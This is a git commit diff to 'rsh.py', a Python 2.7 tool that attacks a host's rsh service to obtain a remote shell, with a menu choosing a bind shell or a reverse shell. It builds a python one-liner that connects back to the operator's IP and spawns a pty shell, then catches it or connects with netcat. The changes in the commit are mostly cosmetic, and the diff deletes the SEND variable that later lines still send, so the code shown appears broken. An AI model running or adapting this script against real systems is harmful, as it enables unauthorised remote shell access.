e3cb56067e6a1a353a23758ba9ce4a6ea57caec5
Charlie Dean <dean.charlie07@gmail.com>
2015-07-29 14:01:09 +0100

    Cleaned code, Added Simple GUI

--- rsh.py
+++ rsh.py
@@ -1,6 +1,5 @@
 #!/usr/bin/python2.7
-#Rsh Bind Shell Module
-
+#Rsh Shell
 import sys
 import socket
 import random
@@ -17,20 +16,14 @@ def handler(signum, frame):
     print '======================YOU SHOULDN\'T HAVE USED CTRL C======================'
 signal.signal(signal.SIGINT, handler)
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 if len(sys.argv) < 4:
-    print "exiting"
     print "Example ./rsh.py 10.129.121.16 foobar foobar"
     sys.exit()
 else:
     host = sys.argv[1]
     fromuser = sys.argv[2]
     username = sys.argv[3]
-    command = ""
-
-SEND="%s\0%s\0%s\0" % (fromuser, username, command)
-
+    
 startport = 600
 endport = 900
 myport =  random.randrange(startport, endport)
@@ -39,7 +32,9 @@ startbindport = 5000
 endbindport = 6000
 bindport =  random.randrange(startbindport, endbindport)
 
-payloadtype = raw_input('1.)Reverse Shell \n2.)Bind Shell\nChoose Your Option: ')
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print '------------------------'
+payloadtype = raw_input('1.)Reverse Shell \n2.)Bind Shell\n------------------------\nChoose Your Option:')
 
 if payloadtype ==str("2"):
     s.bind(('0.0.0.0', myport))
@@ -56,15 +51,16 @@ if payloadtype ==str("2"):
     test = s.recv(1024)
     s.close()
     print 'Using Netcat To Connect To %s On Port %s'% (host, str(bindport))
-    print 'Type Exit Into The Shell To Shut Down The Bind Port'
+    print 'Type Exit Into The Shell Properly Kill The Open Port'
+    print '----------------------------------------------------'
     subprocess.call(['nc' , str(host), str(bindport)])
 elif payloadtype ==str("1"):
 
-    uselocalip = raw_input('Get Ip Automatically? y/n: ')
+    uselocalip = raw_input('Get Ip Automatically? y/n:')
     if uselocalip.lower() =="y":
         localip = getNetworkIp()
     else:
-        localip = raw_input('Type Your Ip For Reverse Connection: ')
+        localip = raw_input('Type Your Ip For Reverse Connection:')
     print "Ip Changed To %s"%(localip)
     reverse1 = 'python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
     reverse2 = 's.connect((\'%s\',%s));'%(localip, bindport)
@@ -77,11 +73,12 @@ elif payloadtype ==str("1"):
     s.send("\0")
     s.send(SEND)
     print 'Using Netcat To Listen To On Port %s'% (str(bindport))
-    print 'Type Exit Into The Shell To Shut Down The Bind Port'
+    print 'Type Exit Into The Shell Properly Kill The Open Port'
+    print '----------------------------------------------------'
     subprocess.call(['nc' ,'-lp', str(bindport)])
     time.sleep(0.5)
     test = s.recv(1024)
     s.close()
 else:
-    s.close()
+    print "Invalid Option"
     sys.exit()
